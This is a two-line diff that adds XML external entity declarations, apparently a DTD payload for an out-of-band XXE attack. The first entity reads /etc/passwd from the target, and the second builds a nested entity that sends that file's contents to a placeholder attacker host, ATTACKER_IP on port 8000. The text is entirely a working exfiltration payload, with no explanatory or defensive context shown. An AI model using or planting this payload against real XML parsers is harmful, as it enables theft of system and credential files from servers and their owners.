@@ -1,0 +1,2 @@
+<!ENTITY % xxePayload SYSTEM "file:///etc/passwd">
+<!ENTITY % internal "<!ENTITY &#37; xxe SYSTEM 'http://ATTACKER_IP:8000/?file-content?%xxePayload;'>">
